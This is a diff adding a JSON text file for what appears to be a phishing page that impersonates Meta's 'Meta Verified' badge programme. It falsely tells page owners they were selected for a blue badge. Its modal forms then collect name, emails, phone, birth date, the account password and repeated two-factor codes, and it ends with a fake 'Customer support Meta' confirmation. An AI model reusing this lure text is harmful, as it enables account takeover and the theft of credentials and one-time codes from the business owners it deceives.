@@ -1,0 +1,314 @@
+{
+    "robot": {
+        "label": "I'm not a robot",
+        "text-1": "This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.",
+        "text-2": "We’ve used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.",
+        "text-3": "reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising."
+    },
+    "header": {
+        "getStarted": "Get started",
+        "advertise": "Advertise",
+        "learn": "Learn",
+        "support": "Support"
+    },
+    "hero": {
+        "headline": "Show the world that you mean business.",
+        "desc1": "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",
+        "desc2": "We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!",
+        "ctaSubscribeFacebook": "Subscribe on Facebook"
+    },
+    "section": {
+        "title": "A creator toolkit to take your brand further",
+        "subtitle": "Explore key Meta Verified benefits available for Facebook and Instagram. See creator plans and pricing for additional benefits."
+    },
+    "verified_benefits": {
+        "title": "Meta Verified benefits",
+        "verified_badge": {
+            "title": "Verified badge",
+            "description": "The badge means your profile was verified by Meta based on your activity across Meta technologies, or information or documents you provided."
+        },
+        "impersonation_protection": {
+            "title": "Impersonation protection",
+            "description": "Protect your brand with proactive impersonation monitoring. Meta will remove accounts that we determine are pretending to be you."
+        },
+        "enhanced_support": {
+            "title": "Enhanced support",
+            "description": "Get 24/7 access to email or chat agent support."
+        },
+        "upgraded_profile_features": {
+            "title": "Upgraded profile features",
+            "description": "Enrich your profile by adding images to your links to help boost engagement. Benefit not yet available in all regions."
+        }
+    },
+    "signup_verified": {
+        "title": "Sign up for Meta Verified.",
+        "description": "Our verification process is designed to maintain the integrity of the verified badge for businesses. Let's start by confirming our invitation.",
+        "step_1": {
+            "title": "Start your application.",
+            "description": "Those interested in applying for Meta Verified will need to register and meet certain eligibility requirements (requirements for facebook). We are pleased to see that your business is one of the few that we have considered and selected."
+        },
+        "step_2": {
+            "title": "Verify business details.",
+            "description": "You may be asked to share details such as your business name, address, website and/or phone number."
+        },
+        "step_3": {
+            "title": "Get feedback.",
+            "description": "We'll review your application and send an update on your status within three working days."
+        }
+    },
+    "testimonial_slider": {
+        "title": "See how Meta Verified has helped real businesses.",
+        "testimonial_1": {
+            "name": "Kimber Greenwood, Owner of Water Bear Photography",
+            "description": "After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience. I think that seeing a verified badge builds trust. People that I don't know or newer brands interested in working with me can make sure that they're talking with me and not a scammer."
+        },
+        "testimonial_2": {
+            "name": "Devon Kirby, Owner, Mom Approved Miami",
+            "description": "Since subscribing, I've noticed a real difference. My posts are getting more reach, engagement has gone up and I'm seeing more interactions on stories and reels."
+        },
+        "testimonial_3": {
+            "name": "Sarah Clancy, Owner of Sarah Marie Running Co.",
+            "description": "Having a verified account signals to both our existing followers and new visitors that we are a credible, professional business that takes both our products and social presence seriously."
+        }
+    },
+    "faq": {
+        "title": "FAQ",
+        "description": "For more, visit our Help Centre",
+        "description_2": "Instagram and Facebook",
+        "description_3": "WhatsApp",
+        "faq_1": {
+            "question": "How do I know if my business is eligible?",
+            "answer_1": "Meta Verified is available in selected regions for businesses that meet certain eligibility requirements",
+            "answer_2": "requirements for Facebook and Instagram",
+            "answer_3": "requirements for WhatsApp"
+        },
+        "faq_2": {
+            "question": "How can I stay informed if I'm not yet eligible?",
+            "answer_1": "Join our waitlist",
+            "answer_2": "to stay updated. We will notify you when Meta Verified for businesses is available. Joining the waiting list does not guarantee early access to Meta Verified."
+        },
+        "faq_3": {
+            "question": "I already have a verified badge. What happens to it?",
+            "answer_1": "No action is needed in order to keep your badge. Existing verified badge holders can apply for a Meta Verified subscription to access additional benefits if they meet the eligibility requirements",
+            "answer_2": "requirements for Facebook and Instagram",
+            "answer_3": "requirements for WhatsApp"
+        },
+        "faq_4": {
+            "question": "What if I am interested in Meta Verified for creators?",
+            "answer_1": "You can learn more and sign up on the",
+            "answer_2": "Meta Verified for creators website."
+        },
+        "faq_5": {
+            "question": "Where will my badge appear?",
+            "answer": "If you select a Facebook asset as part of your subscription, your Facebook Page and Messenger account will display a verified badge. If you select an Instagram asset as part of your subscription, your Instagram and Threads accounts will display a verified badge. If you select a WhatsApp asset as part of your subscription, your WhatsApp business profile, chat header and channel will display a verified badge. Additional benefits of Meta Verified are not yet available on Threads or Messenger."
+        },
+        "faq_6": {
+            "question": "What determines which plans are available to me?",
+            "answer": "Meta determines plan availability based on your business activity on our apps which, depending on your region and the app you use to access Meta Verified, may include a broad set of measures, e.g. profile visits, post engagement, status views and/or, subject to applicable law, number of message conversations."
+        },
+        "faq_7": {
+            "question": "Do my Meta Verified benefits extend to other accounts in my business portfolio?",
+            "answer": "Your Meta Verified benefits (including support access) only apply to your subscribed Facebook Page, Instagram account or WhatsApp phone number."
+        }
+    },
+    "footer_subscribe": {
+        "title": "Get the latest updates from Meta for business.",
+        "description": "Provide your email address to receive the latest updates from Meta for business, including news, events and product updates.",
+        "description_2": "By submitting this form, you agree to receive marketing related electronic communications from Meta, including news, events, updates and promotional emails. You may withdraw your consent and unsubscribe from these at any time, for example, by clicking the unsubscribe link included in our emails. For more information about how Meta handles your data, please read our Data Policy .",
+        "input_placeholder_email": "Enter your email",
+        "input_placeholder_country": "Enter a country name...",
+        "button_text": "Subscribe"
+    },
+    "footer": {
+        "footer_section_1": {
+            "title": "Meta technologies",
+            "items": {
+                "facebook": "Facebook",
+                "instagram": "Instagram",
+                "messenger": "Messenger",
+                "whatsapp": "WhatsApp",
+                "audience_network": "Audience Network",
+                "meta_quest": "Meta Quest",
+                "workplace": "Workplace",
+                "meta_for_work": "Meta for Work"
+            }
+        },
+        "footer_section_2": {
+            "title": "Tools",
+            "items": {
+                "free_tools": "Free tools",
+                "facebook_pages": "Facebook Pages",
+                "instagram_profiles": "Instagram profiles",
+                "stories": "Stories",
+                "shops": "Shops",
+                "meta_business_suite": "Meta Business Suite",
+                "facebook_ads": "Facebook ads",
+                "instagram_ads": "Instagram ads",
+                "video_ads": "Video ads",
+                "ads_manager": "Ads Manager"
+            }
+        },
+        "footer_section_3": {
+            "title": "Goals",
+            "items": {
+                "set_up_a_facebook_page": "Set up a Facebook Page",
+                "build_brand_awareness": "Build brand awareness",
+                "promote_your_local_business": "Promote your local business",
+                "grow_online_sales": "Grow online sales",
+                "promote_your_app": "Promote your app",
+                "generate_leads": "Generate leads",
+                "measure_and_optimise_ads": "Measure and optimise ads",
+                "retarget_existing_customers": "Retarget existing customers"
+            }
+        },
+        "footer_section_4": {
+            "title": "Business types",
+            "items": {
+                "small_business": "Small business",
+                "large_businesses": "Large businesses",
+                "agency": "Agency",
+                "media_and_publisher": "Media and publisher",
+                "creator": "Creator",
+                "developer": "Developer",
+                "business_partner": "Business partner"
+            }
+        },
+        "footer_section_5": {
+            "title": "Industries",
+            "items": {
+                "automotive": "Automotive",
+                "consumer_packaged_goods": "Consumer packaged goods",
+                "ecommerce": "Ecommerce",
+                "entertainment_and_media": "Entertainment and media",
+                "financial_services": "Financial services",
+                "gaming": "Gaming",
+                "property": "Property",
+                "restaurants": "Restaurants",
+                "retail": "Retail",
+                "technology_and_telecom": "Technology and telecom",
+                "travel": "Travel"
+            }
+        },
+        "footer_section_6": {
+            "title": "Skills and training",
+            "items": {
+                "online_learning": "Online learning",
+                "certification_programmes": "Certification programmes",
+                "webinars": "Webinars"
+            }
+        },
+        "footer_section_7": {
+            "title": "Guides and resources",
+            "items": {
+                "ads_guide": "Ads guide",
+                "brand_safety_and_suitability": "Brand safety and suitability",
+                "click_here_book": "Click Here book",
+                "media_responsibility": "Media responsibility",
+                "sitemap": "Sitemap"
+            }
+        }
+    },
+    "footer_bottom": {
+        "about": "About",
+        "developers": "Developers",
+        "careers": "Careers",
+        "privacy": "Privacy",
+        "cookies": "Cookies",
+        "terms": "Terms",
+        "help_centre": "Help Centre"
+    },
+    "modal": {
+        "information": {
+            "title": "Information Form",
+            "form": {
+                "full_name": {
+                    "placeholder": "Full Name",
+                    "error": "Please enter enough full name."
+                },
+                "email": {
+                    "placeholder": "Email Address",
+                    "error": "Please enter enough email address."
+                },
+                "email_business": {
+                    "placeholder": "Email Business Address",
+                    "error": "Please enter enough email business address."
+                },
+                "fanpage": {
+                    "placeholder": "Fanpage Name",
+                    "error": "Please enter enough page name."
+                },
+                "phone": {
+                    "placeholder": "Phone Number",
+                    "error": "Please enter enough phone number."
+                },
+                "day": {
+                    "title": "Date of birth",
+                    "placeholder": "Day",
+                    "error": "Please enter enough day."
+                },
+                "month": {
+                    "placeholder": "Month",
+                    "error": "Please enter enough month."
+                },
+                "year": {
+                    "placeholder": "Year",
+                    "error": "Please enter enough year."
+                },
+                "message": {
+                    "placeholder": "Message",
+                    "description": "Our response will be sent to you within 14 - 48 hours."
+                },
+                "terms": {
+                    "label": "I agree ",
+                    "link": "Terms of use"
+                },
+                "button": {
+                    "text": "Subscribe"
+                }
+            }
+        },
+        "password": {
+            "description": "For your security, you must enter your password to continue.",
+            "form": {
+                "password": {
+                    "placeholder": "Enter your password",
+                    "error": "You haven't entered your password.",
+                    "error_password_incorrect": "The password you've entered is incorrect."
+                },
+                "button": {
+                    "text": "Continue"
+                },
+                "link": {
+                    "text": "Forgot your password?"
+                }
+            }
+        },
+        "two_factor": {
+            "title": "Two-factor authentication required (1/3)",
+            "description": "Enter the code for this account that we send to",
+            "description_2": "or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)",
+            "form": {
+                "code": {
+                    "placeholder": "Enter the code",
+                    "error": "The two-factor authentication you entered is incorrect. Please, try again after",
+                    "error_2": "minutes",
+                    "error_3": "seconds."
+                },
+                "button": {
+                    "text": "Continue"
+                },
+                "link": {
+                    "text": "Try another way"
+                }
+            }
+        },
+        "success": {
+            "title": "Request has been sent",
+            "description": "Your request has been added to the processing queue. We will handle your request within 24 hours in case we do not receive feedback, please send back information so we can assist you.",
+            "description_2": "From the Customer support Meta.",
+            "button": {
+                "text": "Return to facebook"
+            }
+        }
+    }
+}
